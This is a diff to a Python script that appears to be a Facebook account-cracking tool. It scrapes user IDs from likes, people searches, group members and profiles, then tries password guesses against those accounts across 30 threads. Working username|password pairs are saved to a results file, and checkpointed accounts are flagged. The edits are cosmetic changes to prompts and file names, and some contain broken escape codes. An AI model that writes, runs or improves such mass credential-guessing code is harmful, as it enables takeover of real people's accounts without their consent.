@@ -77,7 +77,7 @@ def login(username,password,cek=False):
                 if cek:
                         succes.append(username+"|"+password)
                 else:
-                        with open('results-life.txt','a') as f:
+                        with open('results-succes.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
         elif 'www.facebook.com' in response.json()['error_msg']:
                 print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
@@ -168,7 +168,7 @@ if __name__ == '__main__':
                 print('\033[1;91m👉 \033[0m[\033[1;32m6\033[0m] \033[1;93mRESULTS CHECKS\033[0m')
                 print('\033[1;91m\033[0m\n')
                 print()
-                tanya = input('>>>>>>>>>>> ')
+                tanya = input('👉 ')
                 if tanya =="":
                         exit("[!] Dont be empty")
                 elif tanya == '1':
@@ -184,18 +184,18 @@ if __name__ == '__main__':
                                username = username.replace('m.facebook.com','mbasic.facebook.com')
                         username = fromlikes(username) 
                 elif tanya == '3':
-                        zet = input("# query : ")
+                        zet = input(" \033[1;93mQUERY033[0m : ")
                         username = bysearch(mbasic.format('/search/people/?q='+zet))
                         if len(username) == 0:
                                 exit("# no result")
                 elif tanya == '4':
-                        print("# can only take 100 IDs ")
-                        grab = input("# ID group : ")
+                        print(" \033[1;93mcan only take 1000 IDs033[0m ")
+                        grab = input(" \033[1;93mID group\033[0m : ")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("# ID wrong")
                 elif tanya == '5':
-                        zet = input("# enter username/Id : ")
+                        zet = input(" \033[1;93mENTER USERNAME/ID\033[0m : ")
                         if zet.isdigit():
                                 user = "/profile.php?id=" + zet
                         else:
@@ -234,7 +234,7 @@ if __name__ == '__main__':
                 else:
                         exit("# wrong choice")
                 print()
-                expass = input("[\033[1;32m>\033[0m] \003[1;93mEXTRA PASSWORD\033[0m : ")
+                expass = input("[\033[1;32mEXTRA PASSWORD\033[0m] : ")
                 print("# result will be saved in results-succes.txt and results-check.txt")
                 with ThreadPoolExecutor(max_workers=30) as ex:
                         for user in username:
